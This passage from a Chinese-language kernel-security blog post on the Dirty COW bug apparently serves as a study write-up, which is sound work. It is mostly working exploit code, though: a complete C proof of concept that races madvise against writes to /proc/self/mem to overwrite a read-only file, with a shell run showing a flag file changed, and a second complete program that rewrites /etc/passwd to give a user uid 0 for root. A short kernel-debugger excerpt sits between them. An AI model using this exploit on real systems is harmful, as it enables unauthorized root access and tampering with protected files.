<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str;</span><br><span class="line">    str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">    <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        c+=madvise(<span class="built_in">map</span>,<span class="number">100</span>,MADV_DONTNEED); <span class="comment">/* 取消map的映射 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n&quot;</span>,c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">procselfmemThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *str;</span><br><span class="line">    str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">    <span class="keyword">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>,O_RDWR); <span class="comment">/* 打开mem文件 */</span></span><br><span class="line">    <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++) &#123;</span><br><span class="line">        lseek(f,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>,SEEK_SET); <span class="comment">/* 偏移到map映射的区域 */</span></span><br><span class="line">        c+=write(f,str,<span class="built_in">strlen</span>(str)); <span class="comment">/* 写入目标字符串 */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;procselfmem %d\n&quot;</span>, c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;success!!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc&lt;<span class="number">3</span>) &#123;</span><br><span class="line">        (<span class="keyword">void</span>)<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>,</span><br><span class="line">                      <span class="string">&quot;usage: dirtyc0w target_file new_content&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">    <span class="keyword">pthread_t</span> pth1,pth2;</span><br><span class="line"></span><br><span class="line">    f=open(argv[<span class="number">1</span>],O_RDONLY); </span><br><span class="line">    fstat(f,&amp;st);</span><br><span class="line">    name=argv[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>); <span class="comment">/* 把文件映射到map指向的内存区域 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mmap %zx\n&quot;</span>,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;pth1,<span class="literal">NULL</span>,madviseThread,argv[<span class="number">1</span>]);</span><br><span class="line">    pthread_create(&amp;pth2,<span class="literal">NULL</span>,procselfmemThread,argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    pthread_join(pth1,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pth2,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>结果如下：</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat flag</span><br><span class="line">flag&#123;yhellow&#125;</span><br><span class="line">/ $ ./dirtyc0w flag flag&#123;cooooow&#125;</span><br><span class="line">mmap b7784000</span><br><span class="line">madvise 0</span><br><span class="line">procselfmem 13000000</span><br><span class="line">success!!!</span><br><span class="line">/ $ cat flag</span><br><span class="line">flag&#123;cooooow&#125;</span><br></pre></td></tr></table></figure>
<p>调试内核选用32位的 <code>linux-4.1.4</code>（quem 对64位 <code>linux-4.x</code> 的内核兼容性不是很好，尝试了好几个版本都失败了）</p>
<ul>
<li>断点到 <code>do_page_fault</code>：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0xc1041600</span> &lt;do_page_fault&gt;            push   ebp</span><br><span class="line">  <span class="number">0xc1041601</span> &lt;do_page_fault+<span class="number">1</span>&gt;          mov    ebp, esp</span><br><span class="line">  <span class="number">0xc1041603</span> &lt;do_page_fault+<span class="number">3</span>&gt;          mov    ecx, cr2</span><br><span class="line">► <span class="number">0xc1041606</span> &lt;do_page_fault+<span class="number">6</span>&gt;          call   __do_page_fault                    &lt;__do_page_fault&gt;</span><br><span class="line">       arg[<span class="number">0</span>]: <span class="number">0xf4d33fa8</span> —▸ <span class="number">0xf54bff48</span> —▸ <span class="number">0xf54bff54</span> —▸ <span class="number">0xf54bff6c</span> —▸ <span class="number">0xf54bffac</span> ◂— ...</span><br><span class="line">       arg[<span class="number">1</span>]: <span class="number">0xc1825eca</span> (page_fault+<span class="number">98</span>) ◂— jmp    <span class="number">0xc1824f90</span></span><br><span class="line">       arg[<span class="number">2</span>]: <span class="number">0xbffffffd</span></span><br></pre></td></tr></table></figure>
<ul>
<li>由于本人不会调试内核多线程，后面的操作就没法展示了</li>
</ul>
<p>2.修改 <code>/etc/passwd</code> 中用户的 uid 和组 id 来实现提权：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">writeThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">    <span class="comment">/* 改写passwd文件实现提权 */</span></span><br><span class="line">    <span class="keyword">char</span> *content= <span class="string">&quot;charlie:x:0:0:,,,,,,,,,,,,,,,,,,:/root:/bin/bash&quot;</span>;</span><br><span class="line">    <span class="keyword">off_t</span> offset = (<span class="keyword">off_t</span>) arg;</span><br><span class="line">    <span class="keyword">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">	    lseek(f, offset, SEEK_SET);</span><br><span class="line">	    write(f, content, <span class="built_in">strlen</span>(content));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> file_size = (<span class="keyword">int</span>) arg;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    	madvise(<span class="built_in">map</span>, file_size, MADV_DONTNEED);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> pth1,pth2;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="keyword">int</span> file_size;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> f=open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    </span><br><span class="line">    fstat(f, &amp;st);</span><br><span class="line">    file_size = st.st_size;</span><br><span class="line">    <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>, file_size, PROT_READ, MAP_PRIVATE, f, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> *position = <span class="built_in">strstr</span>(<span class="built_in">map</span>, <span class="string">&quot;yhellow&quot;</span>); <span class="comment">/* 找到对应的用户名位置 */</span></span><br><span class="line">    pthread_create(&amp;pth1, <span class="literal">NULL</span>, madviseThread, (<span class="keyword">void</span> *)file_size); </span><br><span class="line">    pthread_create(&amp;pth2, <span class="literal">NULL</span>, writeThread, position); </span><br><span class="line">    </span><br><span class="line">    pthread_join(pth1, <span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(pth2, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

    </div>

    
    
    

      <footer class="post-footer">
          
          <div class="post-tags">
              <a href="/tags/Kernel/" rel="tag"><i class="fa fa-tag"></i> Kernel</a>
              <a href="/tags/DirtyCow/" rel="tag"><i class="fa fa-tag"></i> DirtyCow</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2022/11/16/Linux%20Swap%E6%9C%BA%E5%88%B6/" rel="prev" title="Linux Swap机制">
      <i class="fa fa-chevron-left"></i> Linux Swap机制
    </a></div>
      <div class="post-nav-item">
    <a href="/2022/11/23/Linux%20UDS%E4%B8%8EFD%E8%BF%81%E7%A7%BB%E6%8A%80%E6%9C%AF/" rel="next" title="Linux UDS与FD迁移技术">
      Linux UDS与FD迁移技术 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">333</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">171</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">5m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">75:28</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
